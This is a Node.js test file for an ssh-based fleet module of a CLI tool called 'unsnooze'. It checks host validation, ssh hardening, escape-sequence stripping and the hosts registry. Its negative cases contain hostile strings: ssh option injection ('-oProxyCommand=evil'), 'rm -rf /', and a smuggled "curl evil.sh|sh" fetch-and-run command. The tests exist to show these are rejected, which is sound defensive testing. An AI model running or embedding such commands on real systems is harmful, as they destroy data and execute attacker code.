// Fleet primitives: host validation, ssh argv hardening, framing, sanitization.
import { test, after } from 'node:test';
import assert from 'node:assert/strict';
import { mkdtempSync, rmSync, writeFileSync, mkdirSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { EventEmitter } from 'node:events';

const DIR = mkdtempSync(join(tmpdir(), 'unsnooze-fleet-test-'));
process.env.UNSNOOZE_STATE_DIR = DIR;

after(() => {
  rmSync(DIR, { recursive: true, force: true });
});

const {
  validHostToken, sshArgs, frameEnvelope, extractEnvelope,
  stripRemoteText, validateEnvelope, SCHEMA, KEY_RE,
} = await import('../src/fleet.js');
const frameIt = frameEnvelope;
const S = SCHEMA;

test('validHostToken: ssh aliases yes, option-injection and metachars no', () => {
  for (const ok of ['build1', 'user@10.0.0.5', 'vpc-a.internal', 'dev_box.example.com']) {
    assert.equal(validHostToken(ok), true, ok);
  }
  for (const bad of ['-oProxyCommand=evil', '--fake', 'host name', 'a;rm -rf /', 'h`x`', '$(x)', '', 'a\nb']) {
    assert.equal(validHostToken(bad), false, JSON.stringify(bad));
  }
});

test('sshArgs: hardening flags fixed, in order, before the host; never StrictHostKeyChecking', () => {
  const args = sshArgs('build1', ['status']);
  const hostIdx = args.indexOf('build1');
  assert.ok(hostIdx > 0, 'host present');
  const flags = args.slice(0, hostIdx).join(' ');
  assert.match(flags, /BatchMode=yes/);
  assert.match(flags, /ConnectTimeout=5/);
  assert.match(flags, /ControlMaster=auto/);
  assert.match(flags, /ControlPersist=60s/);
  assert.ok(args.includes('-T'), 'no TTY on data calls');
  assert.ok(!flags.includes('StrictHostKeyChecking'), 'never touches host-key policy');
  // remote command rides after the host as a single argv tail
  assert.deepEqual(args.slice(hostIdx + 1), ['unsnooze', '_remote', 'status']);
  assert.throws(() => sshArgs('-oProxyCommand=evil', ['status']), /invalid host/);
  assert.throws(() => sshArgs('build1', ['resume', 'bad;key']), /invalid remote arg/);
});

test('frame/extract round-trips and survives motd noise; garbage → null', () => {
  const framed = frameEnvelope({ schema: SCHEMA, hello: 1 });
  assert.equal(extractEnvelope('Welcome to Ubuntu!\n' + framed + '\ntrailing rc noise').hello, 1);
  assert.equal(extractEnvelope('no frame here'), null);
  assert.equal(extractEnvelope('___UNSNOOZE_BEGIN___{broken json___UNSNOOZE_END___'), null);
});

test('stripRemoteText: kills CSI/OSC/C0/C1 and caps length', () => {
  assert.equal(stripRemoteText('\x1b[31mred\x1b[0m'), 'red');
  assert.equal(stripRemoteText('\x1b]0;title\x07cwd'), 'cwd');            // OSC + BEL
  assert.equal(stripRemoteText('\x1b]8;;http://x\x1b\\link\x1b]8;;\x1b\\'), 'link'); // OSC 8 + ST
  assert.equal(stripRemoteText('a\x9bXb'), 'ab');                          // C1 CSI
  assert.equal(stripRemoteText('a\x07\x08b'), 'ab');                       // bare C0
  assert.equal(stripRemoteText('x'.repeat(500), 100).length, 100);
  assert.equal(stripRemoteText(null), '');
});

test('stripRemoteText: strips TAB/LF/CR too, so a field cannot inject fake table rows', () => {
  const out = stripRemoteText('line1\nfake ● online\tcol');
  assert.ok(!out.includes('\n'), 'no newline survives');
  assert.ok(!out.includes('\t'), 'no tab survives');
  assert.ok(!out.includes('\r'), 'no CR survives');
  assert.equal(out, 'line1fake ● onlinecol');
});

test('validateEnvelope: schema window, skew detected, junk rejected', () => {
  const good = { schema: 1, minSchema: 1, cli: '1.13.0', host: 'build1', caps: [], sessions: [] };
  assert.equal(validateEnvelope(good).ok, true);
  assert.equal(validateEnvelope({ schema: 99, minSchema: 99 }).ok, false);
  assert.match(validateEnvelope({ schema: 99, minSchema: 99 }).reason, /skew/);
  assert.equal(validateEnvelope(null).ok, false);
  assert.equal(validateEnvelope({ schema: 'x' }).ok, false);
});

test('KEY_RE accepts real session keys, rejects shell metachars', () => {
  assert.match('92d6f63d-5374-4efc-8181-3218435612d2', KEY_RE);
  assert.match('pane:abc123:1784200000000', KEY_RE);
  assert.doesNotMatch('key;rm -rf', KEY_RE);
  assert.doesNotMatch('a b', KEY_RE);
});

test('hosts registry: add/list/rm round-trip, atomic file, invalid rejected', async () => {
  const { readHosts, writeHosts, cmdHosts } = await import('../src/fleet.js');
  assert.deepEqual({ ...readHosts() }, {});
  assert.equal(await cmdHosts(['add', 'build1']), 0);                    // dest defaults to name
  assert.equal(await cmdHosts(['add', 'gpu', 'ubuntu@10.0.0.7']), 0);
  assert.deepEqual({ ...readHosts() }, {
    build1: { dest: 'build1', auth: 'key' },
    gpu: { dest: 'ubuntu@10.0.0.7', auth: 'key' },
  });
  assert.equal(await cmdHosts(['add', 'bad', '-oProxyCommand=x']), 1);  // invalid dest
  assert.equal(await cmdHosts(['rm', 'build1']), 0);
  assert.deepEqual(Object.keys(readHosts()), ['gpu']);
  assert.equal(await cmdHosts(['rm', 'nope']), 1);
  assert.equal(await cmdHosts(['list']), 0);
  assert.equal(await cmdHosts(['frobnicate']), 2);                       // usage
});

test('readHosts: migrates string entries to key-auth descriptors', async () => {
  const { writeHosts, readHosts } = await import('../src/fleet.js');
  writeHosts({ vpc: 'ubuntu@10.0.0.7' });                       // legacy string on disk
  const h = readHosts();
  assert.deepEqual({ ...h.vpc }, { dest: 'ubuntu@10.0.0.7', auth: 'key' });
});

test('hosts add --auth password --source command stores a descriptor', async () => {
  const { cmdHosts, readHosts } = await import('../src/fleet.js');
  assert.equal(await cmdHosts(['add', 'ci', 'ci@build', '--auth', 'password',
    '--source', 'command', '--cmd', 'op read op://v/ci/pw']), 0);
  const e = readHosts().ci;
  assert.equal(e.auth, 'password');
  assert.equal(e.source, 'command');
  assert.equal(e.cmd, 'op read op://v/ci/pw');
});

test('hosts add: password defaults to prompt source; bad source/auth rejected', async () => {
  const { cmdHosts, readHosts } = await import('../src/fleet.js');
  assert.equal(await cmdHosts(['add', 'lap', 'me@lap', '--auth', 'password']), 0);
  assert.equal(readHosts().lap.source, 'prompt');
  assert.equal(await cmdHosts(['add', 'x', 'x@x', '--auth', 'nope']), 1);
  assert.equal(await cmdHosts(['add', 'y', 'y@y', '--auth', 'password', '--source', 'bogus']), 1);
  // command source requires --cmd; env requires --env
  assert.equal(await cmdHosts(['add', 'z', 'z@z', '--auth', 'password', '--source', 'command']), 1);
});

test('hosts add: --source env requires a valid --env name', async () => {
  const { cmdHosts, readHosts } = await import('../src/fleet.js');
  assert.equal(await cmdHosts(['add', 'e1', 'e1@e1', '--auth', 'password',
    '--source', 'env', '--env', 'bad name!']), 1);                       // invalid identifier
  assert.equal(await cmdHosts(['add', 'e2', 'e2@e2', '--auth', 'password',
    '--source', 'env', '--env', 'UNSNOOZE_PW_E2']), 0);
  assert.equal(readHosts().e2.env, 'UNSNOOZE_PW_E2');
  assert.equal(await cmdHosts(['add', 'e3', 'e3@e3', '--auth', 'password', '--source', 'env']), 0);
  assert.match(readHosts().e3.env, /^UNSNOOZE_PW_E3$/);                  // auto-generated default
});

test('hosts add: --source keychain defaults service/account from name/dest', async () => {
  const { cmdHosts, readHosts } = await import('../src/fleet.js');
  assert.equal(await cmdHosts(['add', 'kc', 'alice@box', '--auth', 'password', '--source', 'keychain']), 0);
  const e = readHosts().kc;
  assert.equal(e.service, 'unsnooze-kc');
  assert.equal(e.account, 'alice');
  assert.equal(await cmdHosts(['add', 'kc2', 'bob@box2', '--auth', 'password', '--source', 'keychain',
    '--service', 'svc', '--account', 'acct']), 0);
  assert.equal(readHosts().kc2.service, 'svc');
  assert.equal(readHosts().kc2.account, 'acct');
});

test('key host still writes/reads as before (regression)', async () => {
  const { cmdHosts, readHosts } = await import('../src/fleet.js');
  assert.equal(await cmdHosts(['add', 'vpc2', 'ubuntu@vpc2']), 0);
  assert.equal(readHosts().vpc2.auth, 'key');
  assert.equal(readHosts().vpc2.dest, 'ubuntu@vpc2');
});

test('writeHosts round-trip: key host serializes as bare string, password host as descriptor', async () => {
  const { cmdHosts, readHosts } = await import('../src/fleet.js');
  const { readFileSync } = await import('node:fs');
  const { STATE_DIR } = await import('../src/config.js');
  const { join: pathJoin } = await import('node:path');
  assert.equal(await cmdHosts(['add', 'plain', 'ubuntu@plain']), 0);
  assert.equal(await cmdHosts(['add', 'secure', 'sec@box', '--auth', 'password']), 0);
  const onDisk = JSON.parse(readFileSync(pathJoin(STATE_DIR, 'hosts.json'), 'utf-8'));
  assert.equal(typeof onDisk.plain, 'string', 'key host stays diff-friendly bare string on disk');
  assert.equal(onDisk.plain, 'ubuntu@plain');
  assert.equal(typeof onDisk.secure, 'object');
  assert.equal(onDisk.secure.auth, 'password');
  // and it still reads back correctly through the normalizer
  assert.equal(readHosts().plain.dest, 'ubuntu@plain');
  assert.equal(readHosts().plain.auth, 'key');
  assert.equal(readHosts().secure.auth, 'password');
});

test('status --json prints machine shape; resume core marks without typing', async () => {
  const { execFileSync } = await import('node:child_process');
  const home = mkdtempSync(join(tmpdir(), 'unsnooze-fleet-e2e-'));
  const stateDir = join(home, '.unsnooze');
  mkdirSync(stateDir, { recursive: true });
  writeFileSync(join(stateDir, 'state.json'), JSON.stringify({
    version: 1, sessions: {
      'aaaa1111-2222-3333-4444-555566667777': {
        key: 'aaaa1111-2222-3333-4444-555566667777',
        sessionId: 'aaaa1111-2222-3333-4444-555566667777',
        agent: 'claude', cwd: '/tmp/p', status: 'stopped',
        resetAt: Date.now() + 3_600_000, resetSource: 'absolute',
        mux: 'tmux', pane: '%1', muxSession: 'unsnooze', attempts: 0,
        limitType: '5h', detectedAt: Date.now(),
      },
    },
  }));
  const env = { ...process.env, UNSNOOZE_STATE_DIR: stateDir, NO_COLOR: '1' };
  const out = execFileSync(process.execPath, ['bin/unsnooze.js', 'status', '--json'], { env, encoding: 'utf-8' });
  const j = JSON.parse(out);
  assert.equal(j.version, 1);
  assert.equal(j.sessions.length, 1);
  assert.equal(j.sessions[0].agent, 'claude');
  assert.equal(j.sessions[0].status, 'stopped');
  rmSync(home, { recursive: true, force: true });
});

// ---------------------------------------------------------------------------
// ssh fan-out, cache, `unsnooze fleet`
// ---------------------------------------------------------------------------

function fakeSsh({ code = 0, stdout = '', delayMs = 5 }) {
  return () => {
    const p = new EventEmitter();
    p.stdout = new EventEmitter();
    p.stderr = new EventEmitter();
    p.kill = () => { p.killed = true; p.emit('close', null, 'SIGKILL'); };
    setTimeout(() => {
      if (stdout) p.stdout.emit('data', Buffer.from(stdout));
      p.emit('close', code);
    }, delayMs);
    return p;
  };
}

const GOOD = frameIt({
  schema: S, minSchema: 1, cli: '9.9.9', host: 'build1', caps: ['resume', 'cancel'],
  sessions: [{ key: 'k1', agent: 'claude', status: 'stopped', cwd: '/tmp\x1b[31mX', resetAt: Date.now() + 60_000, mux: 'tmux', muxSession: 'unsnooze' }],
});

test('fetchHost: online with sanitized fields; motd noise tolerated', async () => {
  const { fetchHost } = await import('../src/fleet.js');
  const r = await fetchHost('build1', 'build1', { spawnFn: fakeSsh({ stdout: 'motd!\n' + GOOD + '\n' }) });
  assert.equal(r.state, 'online');
  assert.equal(r.envelope.sessions[0].cwd, '/tmpX');        // CSI stripped on ingest
  assert.equal(r.envelope.sessions[0].key, 'k1');
});

test('fetchHost: exit 255 → unreachable; garbage → error; skew detected', async () => {
  const { fetchHost } = await import('../src/fleet.js');
  assert.equal((await fetchHost('h', 'h', { spawnFn: fakeSsh({ code: 255 }) })).state, 'unreachable');
  assert.equal((await fetchHost('h', 'h', { spawnFn: fakeSsh({ stdout: 'not json' }) })).state, 'error');
  const skew = frameIt({ schema: 99, minSchema: 99, cli: '9.9.9', host: 'h', caps: [], sessions: [] });
  assert.equal((await fetchHost('h', 'h', { spawnFn: fakeSsh({ stdout: skew }) })).state, 'skew');
});

test('fetchHost: timeout kills and reports unreachable', async () => {
  const { fetchHost } = await import('../src/fleet.js');
  const r = await fetchHost('h', 'h', { spawnFn: fakeSsh({ delayMs: 5_000 }), timeoutMs: 50 });
  assert.equal(r.state, 'unreachable');
  assert.match(r.error, /timeout/);
});

test('fetchFleet: dead host does not block others; stale cache is used', async () => {
  const { fetchFleet, writeFleetCache } = await import('../src/fleet.js');
  writeFleetCache([{ host: 'dead', state: 'online', at: Date.now() - 60_000, envelope: JSON.parse(GOOD.slice('___UNSNOOZE_BEGIN___'.length, -'___UNSNOOZE_END___'.length)) }]);
  const spawns = { good: fakeSsh({ stdout: GOOD }), dead: fakeSsh({ code: 255 }) };
  const results = await fetchFleet({
    hosts: { good: 'good', dead: 'dead' },
    spawnFn: (cmd, args) => spawns[args[args.indexOf('-T') + 1]](),
  });
  const dead = results.find(r => r.host === 'dead');
  assert.equal(dead.state, 'stale');                        // cached data survives
  assert.ok(dead.cachedAt);
  assert.equal(results.find(r => r.host === 'good').state, 'online');
});

test('attachHintRemote wraps the local hint in ssh -t', async () => {
  const { attachHintRemote } = await import('../src/fleet.js');
  assert.equal(attachHintRemote('gpu', 'tmux', 'unsnooze'), `ssh -t gpu 'tmux new -A -s unsnooze'`);
  assert.equal(attachHintRemote('gpu', 'zellij', 'unsnooze'), `ssh -t gpu 'zellij attach unsnooze'`);
});

test('attachHintRemote: hostile muxSession (shell metachars) yields no hint at all', async () => {
  const { attachHintRemote } = await import('../src/fleet.js');
  assert.equal(attachHintRemote('gpu', 'tmux', "x'; curl evil.sh|sh; echo '"), null);
  assert.equal(attachHintRemote('gpu', 'tmux', 'a; rm -rf /'), null);
  assert.equal(attachHintRemote('gpu', 'tmux', 'a b'), null);
  assert.equal(attachHintRemote('gpu', 'tmux', ''), null);
  assert.equal(attachHintRemote('gpu', 'tmux', undefined), null);
});

test('attachHintRemote: hostile dest also yields no hint', async () => {
  const { attachHintRemote } = await import('../src/fleet.js');
  assert.equal(attachHintRemote('-oProxyCommand=evil', 'tmux', 'unsnooze'), null);
  assert.equal(attachHintRemote('a;rm -rf /', 'tmux', 'unsnooze'), null);
});

test('attachHintRemote: a clean muxSession still round-trips', async () => {
  const { attachHintRemote } = await import('../src/fleet.js');
  assert.equal(attachHintRemote('build1', 'zellij', 'my-session.1_2'), `ssh -t build1 'zellij attach my-session.1_2'`);
});

test('fleet table/json path: hostile muxSession produces no attach line', async () => {
  const { fetchFleet, formatFleetTui } = await import('../src/fleet.js');
  const evilSession = frameIt({
    schema: S, minSchema: 1, cli: '9.9.9', host: 'evil', caps: [],
    sessions: [{
      key: 'k1', agent: 'claude', status: 'stopped',
      cwd: '/tmp', resetAt: Date.now() + 60_000, mux: 'tmux',
      muxSession: "x'; curl evil.sh|sh; echo '",
    }],
  });
  const results = await fetchFleet({
    hosts: { evil: 'evil' },
    spawnFn: fakeSsh({ stdout: evilSession }),
  });
  // The rendered table (what `unsnooze fleet` and `--json` consumers act on
  // for display) must never emit an attach hint built from the hostile
  // muxSession, since that hint is meant to be pasted into a shell.
  const tui = formatFleetTui(results, { color: false, hosts: { evil: 'evil' } });
  assert.doesNotMatch(tui, /attach:/);
  assert.doesNotMatch(tui, /curl evil\.sh/);
});

test('collectChild timeout is self-contained (not unref\'d) so safety net always works', async () => {
  const { fetchHost } = await import('../src/fleet.js');
  // Test that a timeout still kills the process even without external keep-alive
  const slow = () => {
    const p = new EventEmitter();
    p.stdout = new EventEmitter();
    p.stderr = new EventEmitter();
    p.kill = () => { p.killed = true; p.emit('close', null, 'SIGKILL'); };
    // Never emit close, simulating a hung process
    setTimeout(() => {
      if (!p.killed) p.emit('close', 0); // only close if not killed
    }, 10_000);
    return p;
  };
  const r = await fetchHost('h', 'h', { spawnFn: slow, timeoutMs: 50 });
  assert.equal(r.state, 'unreachable');
  assert.match(r.error, /timeout/);
});

test('fetchHost with prompt close does not delay due to cleared timeout', async () => {
  const { fetchHost } = await import('../src/fleet.js');
  const start = Date.now();
  const r = await fetchHost('h', 'h', { spawnFn: fakeSsh({ stdout: GOOD, delayMs: 5 }), timeoutMs: 5_000 });
  const elapsed = Date.now() - start;
  assert.equal(r.state, 'online');
  // Should resolve quickly (within ~100ms), not wait for the 5s timeout
  assert.ok(elapsed < 500, `should resolve promptly, took ${elapsed}ms`);
});

test('fetchFleet re-sanitizes cached envelope to strip injected escapes', async () => {
  const { fetchFleet, writeFleetCache, sanitizeEnvelope } = await import('../src/fleet.js');
  // Write a tampered cache entry with ESC in cwd
  const evilEnvelope = {
    schema: S, minSchema: 1, cli: '9.9.9', host: 'evil', caps: [],
    sessions: [{ key: 'k1', agent: 'claude', status: 'stopped', cwd: '/tmp/\x1b]0;x\x07evil', resetAt: Date.now() + 60_000, mux: 'tmux', muxSession: 'unsnooze' }],
  };
  writeFleetCache([{ host: 'evil', state: 'online', at: Date.now() - 60_000, envelope: evilEnvelope }]);

  // Force stale path: host unreachable (exit 255), cache is <24h old
  const spawns = { evil: fakeSsh({ code: 255 }) };
  const results = await fetchFleet({
    hosts: { evil: 'evil' },
    spawnFn: (cmd, args) => spawns[args[args.indexOf('-T') + 1]](),
  });

  const evil = results.find(r => r.host === 'evil');
  assert.equal(evil.state, 'stale');
  // Envelope should be re-sanitized: ESC stripped from cwd
  assert.equal(evil.envelope.sessions[0].cwd, '/tmp/evil');
});
